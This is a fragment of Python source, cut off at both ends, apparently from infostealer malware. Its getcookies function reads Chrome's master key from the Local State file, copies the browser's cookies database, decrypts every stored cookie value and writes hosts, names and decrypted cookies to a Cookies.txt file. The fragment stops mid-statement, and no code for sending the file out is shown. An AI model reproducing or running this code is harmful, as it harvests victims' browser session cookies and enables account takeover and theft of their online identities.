...
def getcookies():
        ...
        master_key = chrome.get_master_key(
            tmp+'\\Google\\Chrome\\User Data\\Local State')
        login_db = tmp+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        login = dir+sep+"Loginvault2.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(appd+"\\Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = chrome.decrypt_val(r[2], master_key)
                if host != "":
                    f.write(
